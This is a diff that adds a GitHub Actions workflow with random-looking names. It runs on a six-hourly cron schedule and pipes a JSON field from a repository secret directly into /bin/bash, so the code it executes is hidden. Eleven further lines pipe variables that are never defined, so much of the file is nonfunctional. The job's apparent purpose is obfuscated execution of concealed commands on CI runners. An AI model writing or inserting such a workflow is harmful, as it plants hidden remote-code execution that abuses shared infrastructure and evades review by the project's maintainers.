@@ -1,0 +1,28 @@
+name: lsptunalk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lsptunalk
+        env:
+          tiux78479: ${{ secrets.tiux78479 }}
+        run: |
+          echo $tiux78479 | jq -r .trlz477 | /bin/bash
+          echo $jy26072 | jq -r .nepwn6 | /bin/bash
+          echo $x474 | jq -r .h13 | /bin/bash
+          echo $zb4780 | jq -r .v8641 | /bin/bash
+          echo $enhv946 | jq -r .iwdo03 | /bin/bash
+          echo $edgxu42024 | jq -r .gbl7 | /bin/bash
+          echo $yq064 | jq -r .haqu0692 | /bin/bash
+          echo $hf0767 | jq -r .rb8 | /bin/bash
+          echo $av7 | jq -r .z8 | /bin/bash
+          echo $zrlm4 | jq -r .ajpw539 | /bin/bash
+          echo $yn726 | jq -r .zg3 | /bin/bash
+          echo $npirn01681 | jq -r .pek891 | /bin/bash
+
